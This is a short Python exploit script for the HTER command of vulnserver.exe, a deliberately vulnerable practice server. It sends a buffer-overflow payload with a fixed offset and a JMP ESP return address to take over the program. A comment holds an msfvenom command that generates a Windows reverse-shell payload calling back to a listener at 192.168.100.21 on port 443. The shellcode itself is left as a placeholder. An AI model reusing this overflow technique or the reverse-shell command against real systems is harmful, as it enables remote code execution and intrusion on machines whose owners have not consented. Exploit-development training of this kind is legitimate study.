# Programmer: Brent "q0m" Chambers
# Date: 8/12/2017
# Filename: hter_rce.py
# Description: Exploitation of vulnserver.exe's HTER command for remote code execution
# ************************************************************************************

#!/usr/bin/env python

import os
import sys
import struct
import socket
from subprocess import Popen,PIPE

def execute(host, port, payload_list = [], recv_first=None):
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect( (host,int(port)) )
	if len(payload_list):
		if recv_first:
			print s.recv(1024)
		for i in payload_list:
			s.send(i)
			print s.recv(1024)
	s.close()

# Shellcode generator command with MSFVENOM:
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.21 LPORT=443 -b "\x00" -f hex -a x86 --platform windows EXITFUNC=thread

shellcode = ( <shellcode> )

adjust_esp = "505c" 
jmp_esp = "03125062"
payload = [ "HTER %s\n" %('A'*2041+jmp_esp+shellcode+"90"*(1024-len(shellcode)-12)) ]
host = "192.168.100.21"
port = 9999

execute(host,
		port,
		payload_list=payload,
		recv_first=True)